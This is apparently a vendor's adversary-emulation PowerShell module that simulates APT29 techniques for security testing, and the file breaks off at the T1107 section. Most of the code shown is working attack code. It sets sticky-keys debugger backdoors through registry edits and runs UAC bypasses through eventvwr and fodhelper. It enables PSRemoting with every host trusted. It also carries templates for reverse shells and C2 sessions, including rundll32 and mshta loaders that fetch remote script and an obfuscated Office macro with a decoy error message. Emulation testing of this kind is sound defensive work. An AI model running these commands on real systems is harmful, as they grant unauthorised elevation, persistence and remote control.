function Invoke-APT29 {

<#
    APT29 Simulator
    gfoss[at]vmware[.]com
    Copyright VMware 2019
    January, 2020
    v.1.0

    .SYNOPSIS
        Quickly simulate the known MITRE ATT&CK TID's associated with APT29 using Atomic Red Team and Custom test scenarios
    
    .EXAMPLE
        Import the module
        PS C:\> Import-Module .\apt29.ps1
        
        Show the help menu:
        PS C:\> Invoke-APT29 -help
    
        List all available simulation techniques - based on MITRE TID's
        PS C:\> Invoke-APT29 -listTechniques

        Search TIDs, attacks, tools, etc.
        PS C:\> Invoke-APT29 -search <search term>

        Establish a reverse shell - note to replace the PowerShell commands here to point to your C2 instance
        PS C:\> Invoke-APT29 -shell
            Variants of this attack are -empire, -meterpreter, -rundll32, and -mshta

        Show APT29-related information for a specific TID
            PS C:\> Invoke-APT29 -<MITRE TID> -about
                
        Show information about a technique such as how it was leveraged by APT29, attack simulation author, and more
        PS C:\> Invoke-APT29 -<MITRE TID> -info
        
        List the available options for a given technique
        PS C:\> Invoke-APT29 -<MITRE TID> -listVariants
            This will display a list of variants associated with the given technique.
            When running the attack, use the listed number to call the associated attack technique.

        Simulate an attack
        PS C:\> Invoke-APT29 -<MITRE TID> -attack -variant <number>
            If the technique only has a single variant, just use the -attack flag
        PS C:\> Invoke-APT29 -<MITRE TID> -attack

        Cleanup after an attack simulation
        PS C:\> Invoke-APT29 -<MITRE TID> -cleanup
            Only necessary when the technique utilizes persistence or makes changes to the disk.
            Most techniques do not have an associated cleanup option.
#>

[CmdLetBinding()]
param(
    [string]$search,
    [string]$variant,
    [switch]$about,    
    [switch]$info,
    [switch]$attack,
    [switch]$listVariants,
    [switch]$cleanup,
    [switch]$listTechniques,
    [switch]$shell,
    [switch]$enablePSRemoting,
    [switch]$disablePSRemoting,
    [switch]$help,
    [switch]$empire,
    [switch]$cobaltStrike,
    [switch]$meterpreter,
    [switch]$rundll32,
    [switch]$mshta,
    [switch]$T1015,
    [switch]$T1088,
    [switch]$T1172,
    [switch]$T1203,
    [switch]$T1107,
    [switch]$T1070,
    [switch]$T1188,
    [switch]$T1075,
    [switch]$T1086,
    [switch]$T1060,
    [switch]$T1053,
    [switch]$T1056,
    [switch]$T1064,
    [switch]$T1045,
    [switch]$T1193,
    [switch]$T1192,
    [switch]$T1204,
    [switch]$T1047,
    [switch]$T1084,
    [switch]$T1114,
    [switch]$T1043,
    [switch]$T1027,
    [switch]$T1097,
    [switch]$T1085,
    [switch]$T1023,
    [switch]$T1095
)

$banner = @"

    (                                      (                    
    )\ )                 )           (     )\ )  *   )   )   )  
   (()/(       )      ( /(   (       )\   (()/(` )  /(( /(( /(  
    /(_))(    /((  (  )\()) ))\ __((((_)(  /(_))( )(_))(_))\()) 
   (_))  )\ )(_))\ )\((_)\ /((_)___)\ _ )\(_)) (_(_()|(_)((_)\  
   |_ _|_(_/(_)((_|(_) |(_|_))     (_)_\(_) _ \|_   _|_  ) _(_) 
    | || ' \)) V / _ \ / // -_)     / _ \ |  _/  | |  / /\_, /  
   |___|_||_| \_/\___/_\_\\___|    /_/ \_\|_|    |_| /___|/_/   
                                                                
"@

if ( $help ) {
    
    Write-Host $banner -ForegroundColor Red

    Write-Host @"
    Quickly simulate the known MITRE ATT&CK techniques associated with APT29 using Atomic Red Team and customized test scenarios

    Import the module
    PS C:\> Import-Module .\Invoke-APT29.ps1
    
    Show the help menu:
    PS C:\> Invoke-APT29 -help
    
    List all available simulation techniques - based on MITRE TID's
    PS C:\> Invoke-APT29 -listTechniques

    Search TIDs, attacks, tools, etc.
    PS C:\> Invoke-APT29 -search <search term>
    
    Enable PSRemoting if you plan to leverage pivoting via PowerShell
    PS C:\> Invoke-APT29 -enablePSRemoting
    
    Establish a reverse shell - note to replace the PowerShell command here to point to your C2 instance
    PS C:\> Invoke-APT29 -shell
        Variants of this attack are -empire, -meterpreter, & LOLBins -rundll32 / -mshta

    Show APT29-related information for a specific TID
    PS C:\> Invoke-APT29 -<MITRE TID> -about
        This will display MITRE ATT&CK information about the TID and simulation instructions
    
    Show detailed information about a technique
    PS C:\> Invoke-APT29 -<MITRE TID> -info
        Highlight how the technique was leveraged by APT29, attack simulation author, and more...
    
    List the available options for a given technique
    PS C:\> Invoke-APT29 -<MITRE TID> -listVariants
        This will display a list of variants associated with the given technique.
        When running the attack, use the listed number to call the associated attack technique.

    Simulate an attack
    PS C:\> Invoke-APT29 -<MITRE TID> -attack -variant <number>
        If the technique only has a single variant, just use the -attack flag
    PS C:\> Invoke-APT29 -<MITRE TID> -attack

    Cleanup after an attack simulation
    PS C:\> Invoke-APT29 -<MITRE TID> -cleanup
        Only necessary when the technique utilizes persistence or makes changes to the disk.
        Most techniques do not have an associated cleanup option.

"@
}

if ( $about ) {

    Write-Host $banner -ForegroundColor Red

    Write-Host @"
APT29 is threat group that has been attributed to the Russian government and has operated since at least 2008. This group reportedly compromised the Democratic National Committee starting in the summer of 2015. This is the group that was leveraged in the 2019 MITRE ATT&CK endpoint security evaluations (https://attackevals.mitre.org/methodology/round2/).

In terms of behaviors, APT29 is distinguished by their commitment to stealth and sophisticated implementations of techniques via an arsenal of custom malware. APT29 typically accomplishes goals via custom compiled binaries and alternate execution methods such as PowerShell and WMI. APT29 has also been known to employ various operational cadences (smash-and-grab vs. slow-and-deliberate) depending on the perceived intelligence value and/or infection method of victims.

Associations / Aliases: YTTRIUM, The Dukes, Cozy Bear, CozyDuke

Tools Leveraged in their documented engagements:
    * CloudDuke
    * Cobalt Strike
    * CosmicDuke
    * CozyCar
    * GeminiDuke
    * HAMMERTOSS
    * Meek
    * Mimikatz
    * MiniDuke
    * OnionDuke
    * PinchDuke
    * POSHSPY
    * PowerDuke
    * PsExec
    * SDelete
    * SeaDuke
    * TOR

Links and Resources:
    * https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf
    * https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296A_GRIZZLY%20STEPPE-2016-1229.pdf
    * https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/
    * http://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016
    * http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory
    * https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html
    * https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html
    * https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/
    * https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html
    * https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/

Source: MITRE ATT&CK
    * https://attack.mitre.org/groups/G0016/
    * https://attackevals.mitre.org/methodology/round2/
    * All ATT&CK related information within this script has been sourced directly from MITRE's website

WARNING:
    * Using this script will trigger events in Anti Virus, EDR, and related endpoint security software.
    * This script also has the potential to configure your system insecurely.
    * Ensure that you are using this script in a controlled test environment. Do not run on an enterprise network.
    * VMware Carbon Black is not liable for any issues resulting from using this script.

"@
break;
}

if ( $listTechniques ) {
    Write-Host ""
    Write-Host "TID -- Technique, Details" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Gray
    Write-Host "T1015" -ForegroundColor Green -NoNewline
    Write-Host " -- Accessibility Features, APT29 used sticky-keys to obtain unauthenticated, privileged console access"
    Write-Host "T1088" -ForegroundColor Green -NoNewline
    Write-Host " -- Bypass User Account Control, APT29 has bypassed UAC to elevate privileges and expand access"
    Write-Host "T1172" -ForegroundColor Green -NoNewline
    Write-Host " -- Domain Fronting, APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic"
    Write-Host "T1203" -ForegroundColor Green -NoNewline
    Write-Host " -- Exploitation for Client Execution, APT29 has used multiple software exploits for common client software, like Microsoft Word and Adobe Reader, to gain code execution"
    Write-Host "T1107" -ForegroundColor Green -NoNewline
    Write-Host " -- File Deletion, APT29 used SDelete to remove artifacts from victims"
    Write-Host "T1070" -ForegroundColor Green -NoNewline
    Write-Host " -- Indicator Removal on Host, APT29 used SDelete to remove artifacts from victims"
    Write-Host "T1188" -ForegroundColor Green -NoNewline
    Write-Host " -- Multi-hop Proxy, A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB)"
    Write-Host "T1075" -ForegroundColor Green -NoNewline
    Write-Host " -- Pass the Hash, APT29 used Kerberos ticket attacks for lateral movement"
    Write-Host "T1086" -ForegroundColor Green -NoNewline
    Write-Host " -- PowerShell, APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke and evade defenses"
    Write-Host "T1060" -ForegroundColor Green -NoNewline
    Write-Host " -- Registry Run Keys / Startup Folder, APT29 added Registry Run keys to establish persistence"
    Write-Host "T1053" -ForegroundColor Green -NoNewline
    Write-Host " -- Scheduled Task, APT29 used named and hijacked scheduled tasks to establish persistence"
    Write-Host "T1064" -ForegroundColor Green -NoNewline
    Write-Host " -- Scripting, APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke, as well as to evade defenses"
    Write-Host "T1045" -ForegroundColor Green -NoNewline
    Write-Host " -- Software Packing, APT29 used UPX to pack files"
    Write-Host "T1193" -ForegroundColor Green -NoNewline
    Write-Host " -- Spearphishing Attachment, APT29 has used spearphishing with an attachment to deliver files with exploits to initial victims"
    Write-Host "T1192" -ForegroundColor Green -NoNewline
    Write-Host " -- Spearphishing Link, APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files"
    Write-Host "T1204" -ForegroundColor Green -NoNewline
    Write-Host " -- User Execution, APT29 has used various forms of spearphishing attempting to get a user to open links or attachments"
    Write-Host "T1047" -ForegroundColor Green -NoNewline
    Write-Host " -- Windows Management Instrumentation, APT29 used WMI to steal credentials and execute backdoors at a future time"
    Write-Host "T1084" -ForegroundColor Green -NoNewline
    Write-Host " -- Windows Management Instrumentation Event Subscription, APT29 has used WMI event filters to establish persistence"
    Write-Host "T1114" -ForegroundColor Green -NoNewline
    Write-Host " -- Email Collection from a local Outlook instance. APT29 collected and exfiltrated emails in the infamous DNC hack"
    Write-Host "T1043" -ForegroundColor Green -NoNewline
    Write-Host " -- Commonly Used Port, APT29 has used Port Number 443 for C2"
    Write-Host "T1027" -ForegroundColor Green -NoNewline
    Write-Host " -- Obfuscated Files or Information, APT29 uses PowerShell to use Base64 for obfuscation"
    Write-Host "T1097" -ForegroundColor Green -NoNewline
    Write-Host " -- Pass the Ticket, APT29 used Kerberos ticket attacks for lateral movement"
    Write-Host "T1085" -ForegroundColor Green -NoNewline
    Write-Host " -- Rundll32, APT29 has used rundll32.exe for execution"
    Write-Host "T1023" -ForegroundColor Green -NoNewline
    Write-Host " -- Shortcut Modification, APT29 drops a Windows shortcut file for execution"
    Write-Host "T1095" -ForegroundColor Green -NoNewline
    Write-Host " -- Standard Non-Application Layer Protocol, APT29 uses TCP for C2 communications"
    break;
}

if ( $search ) {

    $allTechniques = @"
    T1015 -- Accessibility Features, APT29 used sticky-keys to obtain unauthenticated, privileged console access
    T1088 -- Bypass User Account Control, APT29 has bypassed UAC to elevate privileges and expand access
    T1172 -- Domain Fronting, APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic
    T1203 -- Exploitation for Client Execution, APT29 has used multiple software exploits for common client software, like Microsoft Word and Adobe Reader, to gain code execution
    T1107 -- File Deletion, APT29 used SDelete to remove artifacts from victims
    T1070 -- Indicator Removal on Host, APT29 used SDelete to remove artifacts from victims
    T1188 -- Multi-hop Proxy, A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB)
    T1075 -- Pass the Hash, APT29 used Kerberos ticket attacks for lateral movement via invoke-mimikatz
    T1086 -- PowerShell, APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke and evade defenses
    T1060 -- Registry Run Keys / Startup Folder, APT29 added Registry Run keys to establish persistence
    T1053 -- Scheduled Task, APT29 used named and hijacked scheduled tasks to establish persistence
    T1064 -- Scripting, APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke, as well as to evade defenses
    T1045 -- Software Packing, APT29 used UPX to pack files
    T1193 -- Spearphishing Attachment, APT29 has used spearphishing with an attachment to deliver files with exploits to initial victims
    T1192 -- Spearphishing Link, APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files
    T1204 -- User Execution, APT29 has used various forms of spearphishing attempting to get a user to open links or attachments
    T1047 -- Windows Management Instrumentation, APT29 used WMI to steal credentials and execute backdoors at a future time
    T1084 -- Windows Management Instrumentation Event Subscription, APT29 has used WMI event filters to establish persistence
    T1114 -- Email Collection from a local Outlook instance. APT29 collected and exfiltrated emails in the infamous DNC hack
    T1043 -- Commonly Used Port, APT29 has used Port Number 443 for C2
    T1027 -- Obfuscated Files or Information, APT29 uses PowerShell to use Base64 for obfuscation
    T1097 -- Pass the Ticket, APT29 used Kerberos ticket attacks for lateral movement via invoke-mimikatz
    T1085 -- Rundll32, APT29 has used rundll32.exe for execution
    T1023 -- Shortcut Modification, APT29 drops a Windows shortcut file for execution
    T1095 -- Standard Non-Application Layer Protocol, APT29 uses TCP for C2 communications
"@

$matches = $allTechniques | findstr -i $search
$matchCount = $matches.Length

if ( $matchCount -gt 0 ) {
    Write-Host ""
    Write-Host $matchCount -ForegroundColor Green -NoNewline
    Write-Host " Techniques Found!"
    Write-Host "==================================================" -ForegroundColor Green
    foreach ($i in $matches) { Write-Host $i }
    Write-Host "==================================================" -ForegroundColor Green
    Write-Host ""
    break;
} else {
    Write-Host ""
    Write-Host "ERROR: No Techniques found for " -NoNewline -ForegroundColor Red
    Write-Host $search -NoNewline
    Write-Host "... Please try again" -ForegroundColor Red
    Write-Host ""
    break;
}

}

if ( $enablePSRemoting ) {
    Write-Host "Enabling PSRemoting and allowing access to any remote user with valid credentials..."
    Enable-PSRemoting -Force
    Set-Service WinRM -StartMode Automatic
    Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
    Set-Item WSMan:localhost\client\trustedhosts -value *
    Get-Item WSMan:\localhost\Client\TrustedHosts
    break;
}

if ( $disablePSRemoting ) {
    Write-Host "Disabling PSRemoting and blocking access for remote users..."
    Disable-PSRemoting
    break;
}

if ( $shell ) {

    $sctExample = @"
<?xml version="1.0"?>

<package>
<component id="pl0p">

<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -noP -sta -w 1 -enc  SQBmACgA..."); 
]]>
</script>

</component>
</package>
"@

    if ( $empire ) {
        Write-Host "Establishing a remote Empire session over port 80... PowerShell window will exit following execution"
        sleep 5
        Write-Host "Replace this line with a PowerShell payload generated from Empire specific to your environment"
        Write-Host "    Eg: powershell -noP -sta -w 1 -enc  SQBmACgAJABQA..." -ForegroundColor Gray
    } elseif ( $meterpreter ) {
        Write-Host "Establishing a remote Meterpreter session over port 443... PowerShell window will exit following execution"
        sleep 5
        Write-Host "Replace this line with a PowerShell payload generated from Metasploit specific to your environment"
        Write-Host "    Eg: powershell /w 1 /C s''v xTJ -;s''v KRS e''c;s''v Tn ((g''v xTJ).value.toString()..." -ForegroundColor Gray
    } elseif ( $rundll32 ) {
        Write-Host "Establishing remote Empire session over port 80 via Rundll32... PowerShell window will remain active until process migration / exit"
        sleep 5
        Write-Host "Generate an SCT payload that you can execute with the example attack string below using regsvr32.exe"
        Write-Host "Replace the <EXAMPLE URL> below with your attack payload. This can leverage any number of payload strings generated from the C2 platform you are most comfortable with"
        Write-Host "SCT Example:"
        Write-Host "----------"
        Write-Host $sctExample -ForegroundColor Gray
        Write-Host "----------"
        Write-Host "Executing the attack:"
        Write-Host "cmd.exe /C 'rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();GetObject(`"script:<EXAMPLE URL>`");'" -ForegroundColor Gray
        Write-Host "Replace these lines with your own C2 information"
    } elseif ( $mshta ) {
        Write-Host "Establishing remote Empire session over port 80 via MSHTA"
        sleep 5
        Write-Host "Generate an SCT payload that you can execute with the example attack string below using mshta.exe"
        Write-Host "Replace the <EXAMPLE URL> below with your attack payload. This can leverage any number of payload strings generated from the C2 platform you are most comfortable with"
        Write-Host "SCT Example:"
        Write-Host "----------"
        Write-Host $sctExample -ForegroundColor Gray
        Write-Host "----------"
        Write-Host "Executing the attack:"
        Write-Host "    cmd.exe /C 'mshta.exe javascript:a=GetObject(`"script:<EXAMPLE URL>`");'" -ForegroundColor Gray
        Write-Host "Replace these lines with the updated attack"
    } else {
        Write-Host "Please select an available reverse-shell option:"
        Write-Host "Empire, Meterpreter, CobaltStrike, rundll32, mshta, or create your own variant :-)"
        Write-Host ""
    }
}

# T1015 - Accessibility Features
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1015
if ( $T1015 ) {

    $information = @"
APT29 used sticky-keys to obtain unauthenticated, privileged console access.

Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1015
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - Attaches Command Prompt As Debugger To Process - osk"
        Write-Host "[ 2 ] - Attaches Command Prompt As Debugger To Process - sethc"
        Write-Host "[ 3 ] - Attaches Command Prompt As Debugger To Process - utilman"
        Write-Host "[ 4 ] - Attaches Command Prompt As Debugger To Process - magnify"
        Write-Host "[ 5 ] - Attaches Command Prompt As Debugger To Process - narrator"
        Write-Host "[ 6 ] - Attaches Command Prompt As Debugger To Process - DisplaySwitch"
        Write-Host "[ 7 ] - Attaches Command Prompt As Debugger To Process - AtBroker"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $attack ) {
        
        if ( $variant -eq 1 ) {
            Write-Host "Attaching Command Prompt As Debugger To Process - osk"
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
        } elseif ( $variant -eq 2 ) {
            Write-Host "Attaching Command Prompt As Debugger To Process - sethc"
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
        } elseif ( $variant -eq 3 ) {
            Write-Host "Attaching Command Prompt As Debugger To Process - utilman"
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
        } elseif ( $variant -eq 4 ) {
            Write-Host "Attaching Command Prompt As Debugger To Process - magnify"
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
        } elseif ( $variant -eq 5 ) {
            Write-Host "Attaching Command Prompt As Debugger To Process - narrator"
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
        } elseif ( $variant -eq 6 ) {
            Write-Host "Attaching Command Prompt As Debugger To Process - DisplaySwitch"
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
        } elseif ( $variant -eq 7 ) {
            Write-Host "Attaching Command Prompt As Debugger To Process - atbroker"
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
        } else {
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "Removing all existing Stickey Keys attacks..."
        Write-Host "Select 'Yes' at each prompt!"
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
        Write-Host "All Stickey Keys Variants have been successfully removed!"
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-7). Use -listVariants to see the available options."
        Write-Host ""
    }
}

# T1088 - Bypass User Account Control
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1088
if ( $T1088 ) {

    $information = @"
APT29 has bypassed UAC to gain privileged access to target systems.

Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1088/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1088
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - Bypass UAC using Event Viewer"
        Write-Host "[ 2 ] - Bypass UAC using Event Viewer - PowerShell"
        Write-Host "[ 3 ] - Bypass UAC using Fodhelper"
        Write-Host "[ 4 ] - Bypass UAC using Fodhelper - PowerShell"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $attack ) {
        if ( $variant -eq 1 ) {
            Write-Host "Bypassing UAC using Event Viewer"
            Write-Host "Executng the following commands:"
            Write-Host 'reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f' -ForegroundColor Gray
            Write-Host 'cmd.exe /c eventvwr.msc' -ForegroundColor Gray
            reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
            cmd.exe /c eventvwr.msc 
        } elseif ( $variant -eq 2 ) {
            Write-Host "Bypassing UAC using Event Viewer with PowerShell"
            New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
            Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
            Start-Process "C:\Windows\System32\eventvwr.msc"
        } elseif ( $variant -eq 3 ) {
            Write-Host "Bypassing UAC using Fodhelper"
            Write-Host "Executing the following commands:"
            Write-Host 'reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f' -ForegroundColor Gray
            Write-Host 'reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"' -ForegroundColor Gray
            Write-Host 'fodhelper.exe' -ForegroundColor Gray
            reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
            reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
            fodhelper.exe
        } elseif ( $variant -eq 4 ) {
            Write-Host "Bypassing UAC using Fodhelper - PowerShell"
            New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
            New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
            Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
            Start-Process "C:\Windows\System32\fodhelper.exe"
        } else {
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "Cleanup Option Not Yet Available..."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-4). Use -listVariants to see the available options."
        Write-Host ""
    }
}

# T1172 - Domain Fronting
if ( $T1172 ) {
    
    $information = @"
APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic

Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1172/

Attack Source:
    - Manual Simulation (ಥ⌣ಥ)
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ($listVariants) {
        Write-Host ""
        Write-Host "Domain Fronting must be configured and executed manually."
        Write-Host ""
        break;
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Domain Fronting must be configured and executed manually."
        Write-Host ""
    }
}

# T1203 - Exploitation for Client Execution
if ( $T1203 ) {
    
    $information = @"
APT29 has used multiple software exploits for common client software, like Microsoft Word and Adobe Reader, to gain code execution and initial foothold into target organizations.

Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Examples:

    * Browser-based Exploitation
    * Office Applications
    * Common Third-Party Applications

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1203/

Attack Source:
    - Manual Simulation (ಥ⌣ಥ)
"@
    
    if ($listVariants) {
        Write-Host ""
        Write-Host "There is a single variant for this technique - generate and launch a macro-enabled office document"
        Write-Host ""
        break;
    }
    
    if ($attack) {
        Write-Host "Generate an office document and add the following macro."
        Write-Host "Once The document is generated, save the file as a .docm and then close the document."
        Write-Host "Open the newly-generated .docm file to trigger the attack, which simply launches calc.exe."
        Write-Host "Note - you may need to click 'enable content' and depending on other controls in place, you may need to manually run the macro."
        Write-Host "MACRO:"
        $macroExample = @"
Sub Auto_Open()
Dim livDNDtH
livDNDtH =  " /w 1 /C ""sv GoM -;sv jq ec;sv Fkd ((gv GoM).value.toString()+(gv jq).value.toString());" & "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l" & " (gv Fkd).value.toString() ('YwBhAGwAYwAuAGUAeABlAAoA')"""


Dim WRUUtKh
WRUUtKh = "S" & "h" & "e" & "l" & "l" 
Dim OaDaoQTl
OaDaoQTl = "W" & "S" & "c" & "r" & "i" & "p" & "t" 
Dim aHHkcUQeE
aHHkcUQeE = OaDaoQTl & "." & WRUUtKh
Dim SHRJkxCCAZ
Dim pNSqETsnmGthyv
Set SHRJkxCCAZ = VBA.CreateObject(aHHkcUQeE)
Dim waitOnReturn As Boolean: waitOnReturn = False
Dim windowStyle As Integer: windowStyle = 0
Dim QimEMxAWt
QimEMxAWt = "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l" & "." & "e" & "x" & "e"  & " "
SHRJkxCCAZ.Run QimEMxAWt & livDNDtH, windowStyle, waitOnReturn

Dim title As String
title = "Microsoft Office (Compatibility Mode)"
Dim msg As String
Dim intResponse As Integer
msg = "This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]"
intResponse = MsgBox(msg, 16, title)
Application.Quit
End Sub
"@
        Write-Host "===================="
        Write-Host $macroExample -ForegroundColor Gray
        Write-Host "===================="
        break;
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Generate a malicious office document and utilize this to generate a reverse shell."
        Write-Host "Another option is to simulate a phishing attack using an lnk file."
        Write-Host ""
    }
}

# T1107 - File Deletion
